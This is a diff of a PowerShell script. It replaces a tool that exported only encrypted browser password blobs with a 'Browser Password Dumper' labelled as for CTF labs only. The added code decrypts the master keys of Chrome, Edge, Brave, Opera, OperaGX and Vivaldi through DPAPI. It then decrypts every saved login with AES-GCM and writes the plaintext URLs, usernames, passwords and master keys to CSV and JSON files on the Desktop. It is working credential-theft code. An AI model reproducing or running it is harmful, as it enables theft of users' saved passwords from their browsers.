@@ -1,182 +1,143 @@
-# Universal Chromium Browser Encrypted Password Extraction Script
-# For educational use (CTF / cybersecurity labs). Extracts *encrypted* password data only.
+# =========================================
+# Browser Password Dumper (for CTF labs only)
+# Works with: Chrome, Edge, Brave, Opera, OperaGX, Vivaldi
+# =========================================
 
-param(
-    [string]$CSVPath = ".\BrowsersEncryptedPasswords.csv",
-    [string]$JSONPath = ".\BrowsersEncryptedData.json"
-)
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class DPAPI {
+    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    private static extern bool CryptUnprotectData(
+        ref DATA_BLOB pCipherText,
+        string pszDescription,
+        ref DATA_BLOB pEntropy,
+        IntPtr pReserved,
+        IntPtr pPromptStruct,
+        int dwFlags,
+        ref DATA_BLOB pPlainText);
 
-Write-Host "Universal Chromium Browser Encrypted Password Extraction Tool" -ForegroundColor Green
-Write-Host "=================================================================" -ForegroundColor Green
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    internal struct DATA_BLOB {
+        public int cbData;
+        public IntPtr pbData;
+    }
 
-# Define supported browsers and their paths
-$BrowserPaths = @{
-    "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    public static byte[] Decrypt(byte[] cipherText) {
+        DATA_BLOB cipherBlob = new DATA_BLOB();
+        DATA_BLOB plainBlob = new DATA_BLOB();
+        DATA_BLOB entropyBlob = new DATA_BLOB();
+
+        try {
+            cipherBlob.pbData = Marshal.AllocHGlobal(cipherText.Length);
+            cipherBlob.cbData = cipherText.Length;
+            Marshal.Copy(cipherText, 0, cipherBlob.pbData, cipherText.Length);
+
+            if (!CryptUnprotectData(ref cipherBlob, null, ref entropyBlob, IntPtr.Zero, IntPtr.Zero, 0, ref plainBlob))
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
+
+            byte[] plainText = new byte[plainBlob.cbData];
+            Marshal.Copy(plainBlob.pbData, plainText, 0, plainBlob.cbData);
+            return plainText;
+        }
+        finally {
+            if (cipherBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(cipherBlob.pbData);
+            if (plainBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(plainBlob.pbData);
+            if (entropyBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(entropyBlob.pbData);
+        }
+    }
+}
+"@
+
+# AES-GCM decryption
+function Decrypt-ChromePassword($encryptedBytes, $masterKey) {
+    if ($encryptedBytes[0] -eq 118 -and $encryptedBytes[1] -eq 49 -and $encryptedBytes[2] -eq 48) {
+        # "v10"/"v11" => AES-GCM
+        $iv = $encryptedBytes[3..14]
+        $cipherBytes = $encryptedBytes[15..($encryptedBytes.Length-1)]
+        $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+        $plaintext = New-Object byte[] ($cipherBytes.Length - 16)
+        $tag = $cipherBytes[-16..-1]
+        $cipher = $cipherBytes[0..($cipherBytes.Length-17)]
+        $aes.Decrypt($iv, $cipher, $tag, $plaintext)
+        return [System.Text.Encoding]::UTF8.GetString($plaintext)
+    } else {
+        # Old DPAPI
+        return [System.Text.Encoding]::UTF8.GetString([DPAPI]::Decrypt($encryptedBytes))
+    }
+}
+
+# Extract and decrypt master key
+function Get-MasterKey($localStatePath) {
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encKey = $localState.os_crypt.encrypted_key
+    $encKeyBytes = [System.Convert]::FromBase64String($encKey)
+    $encKeyBytes = $encKeyBytes[5..($encKeyBytes.Length-1)] # remove DPAPI prefix
+    return [DPAPI]::Decrypt($encKeyBytes)
+}
+
+# Target browsers
+$browsers = @{
     "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
     "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
     "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
     "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
     "Vivaldi"  = "$env:LOCALAPPDATA\Vivaldi\User Data"
 }
 
-# Function to install SQLite3 if needed
-function Install-SQLiteIfNeeded {
-    if (-not (Test-Path ".\sqlite3.exe")) {
-        try {
-            Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
-            $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
-            $tempZip = "sqlite-temp.zip"
-            
-            Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
-            Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
-            Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
-            
-            Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
-            Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
-            
-            Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
-        } catch {
-            Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
-            exit 1
+$results = @()
+
+foreach ($browser in $browsers.Keys) {
+    $base = $browsers[$browser]
+    if (-not (Test-Path $base)) { continue }
+
+    $localStatePath = Join-Path $base "Local State"
+    if (-not (Test-Path $localStatePath)) { continue }
+
+    $masterKey = Get-MasterKey $localStatePath
+
+    $defaultPath = Join-Path $base "Default\Login Data"
+    if (-not (Test-Path $defaultPath)) { continue }
+
+    $tempDb = "$env:TEMP\$browser-login.db"
+    Copy-Item $defaultPath $tempDb -Force
+
+    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;New=False;Compress=True;")
+    $conn.Open()
+    $cmd = $conn.CreateCommand()
+    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+    $reader = $cmd.ExecuteReader()
+    while ($reader.Read()) {
+        $url = $reader.GetString(0)
+        $username = $reader.GetString(1)
+        $passwordBytes = $reader.GetValue(2)
+        if ($passwordBytes.Length -gt 0) {
+            try {
+                $password = Decrypt-ChromePassword $passwordBytes $masterKey
+            } catch {
+                $password = "[DecryptionFailed]"
+            }
+        } else {
+            $password = ""
+        }
+        $results += [PSCustomObject]@{
+            Browser   = $browser
+            URL       = $url
+            Username  = $username
+            Password  = $password
+            MasterKey = [System.Convert]::ToBase64String($masterKey)
         }
     }
+    $reader.Close()
+    $conn.Close()
+    Remove-Item $tempDb -Force
 }
 
-# Function to extract master key from Local State file
-function Get-MasterKey {
-    param ($browserName, $browserPath)
+# Export
+$results | Export-Csv -Path "$env:USERPROFILE\Desktop\browser_passwords.csv" -NoTypeInformation -Encoding UTF8
+$results | ConvertTo-Json | Out-File "$env:USERPROFILE\Desktop\browser_passwords.json" -Encoding UTF8
 
-    $localStatePath = Join-Path $browserPath "Local State"
-    if (-not (Test-Path $localStatePath)) { return $null }
-
-    try {
-        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = $localStateContent.os_crypt.encrypted_key
-        if ($encryptedKey) {
-            return @{
-                Browser       = $browserName
-                EncryptedKey  = $encryptedKey
-                KeyLength     = ([System.Convert]::FromBase64String($encryptedKey)).Length
-                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-            }
-        }
-    } catch { return $null }
-}
-
-# Function to extract encrypted passwords from Chromium browser
-function Get-EncryptedPasswords {
-    param ($browserName, $browserPath)
-
-    $loginDataPath = Join-Path $browserPath "Default\Login Data"
-    if (-not (Test-Path $loginDataPath)) { return @() }
-
-    $results = @()
-    $encryptedData = @()
-
-    try {
-        $tempDbPath = "temp_${browserName}.db"
-        Copy-Item $loginDataPath $tempDbPath -Force
-
-        $tempCsvPath = "temp_${browserName}_output.csv"
-        $sqlitePath = ".\sqlite3.exe"
-
-        $query = @"
-SELECT 
-    origin_url, 
-    username_value, 
-    hex(password_value) as password_hex,
-    length(password_value) as password_length
-FROM logins;
-"@
-        & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
-
-        if (Test-Path $tempCsvPath) {
-            $logins = Import-Csv $tempCsvPath
-            foreach ($login in $logins) {
-                $entryId = [System.Guid]::NewGuid().ToString()
-
-                $encryptedEntry = @{
-                    Id = $entryId
-                    Browser = $browserName
-                    URL = $login.origin_url
-                    Username = $login.username_value
-                    HexData = $login.password_hex
-                    DataLength = $login.password_length
-                    EncryptionVersion = "Unknown"
-                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                }
-
-                # Detect encryption prefix (v10, v11, v20)
-                if ($login.password_hex -and $login.password_hex.Length -ge 6) {
-                    try {
-                        $prefixBytes = [System.Convert]::ToByte($login.password_hex.Substring(0, 2), 16),
-                                      [System.Convert]::ToByte($login.password_hex.Substring(2, 2), 16),
-                                      [System.Convert]::ToByte($login.password_hex.Substring(4, 2), 16)
-                        $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
-                        if ($prefix -in @("v10","v11","v20")) {
-                            $encryptedEntry.EncryptionVersion = $prefix
-                        }
-                    } catch { }
-                }
-
-                $encryptedData += $encryptedEntry
-
-                $results += [PSCustomObject]@{
-                    ID = $entryId
-                    Browser = $browserName
-                    URL = $login.origin_url
-                    Username = $login.username_value
-                    EncryptionVersion = $encryptedEntry.EncryptionVersion
-                    DataLength = $login.password_length
-                    HexData = if ($login.password_hex.Length -gt 100) {
-                                $login.password_hex.Substring(0, 100) + "..."
-                              } else { $login.password_hex }
-                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                }
-            }
-            Remove-Item $tempCsvPath -Force
-        }
-        Remove-Item $tempDbPath -Force
-    } catch { }
-
-    return @{ Summary = $results; DetailedData = $encryptedData }
-}
-
-# --- Main Execution ---
-Install-SQLiteIfNeeded
-
-$allSummaries = @()
-$allDetails = @()
-$allKeys = @()
-
-foreach ($browser in $BrowserPaths.Keys) {
-    $path = $BrowserPaths[$browser]
-    Write-Host "`n>>> Processing $browser..." -ForegroundColor Cyan
-
-    $keyInfo = Get-MasterKey -browserName $browser -browserPath $path
-    if ($keyInfo) { $allKeys += $keyInfo }
-
-    $result = Get-EncryptedPasswords -browserName $browser -browserPath $path
-    $allSummaries += $result.Summary
-    $allDetails += $result.DetailedData
-}
-
-if ($allSummaries.Count -gt 0) {
-    Write-Host "`nExtracted $($allSummaries.Count) encrypted password entries from all browsers." -ForegroundColor Green
-    $allSummaries | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
-
-    $exportData = @{
-        Metadata = @{
-            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-            OS = [System.Environment]::OSVersion.VersionString
-        }
-        MasterKeys = $allKeys
-        EncryptedPasswords = $allDetails
-    }
-    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8
-
-    Write-Host "Summary exported to: $CSVPath" -ForegroundColor Green
-    Write-Host "Detailed encrypted data exported to: $JSONPath" -ForegroundColor Green
-} else {
-    Write-Host "`nNo encrypted passwords found in any supported browser." -ForegroundColor Yellow
-}
+Write-Host "✅ Extraction complete. Files saved on Desktop."
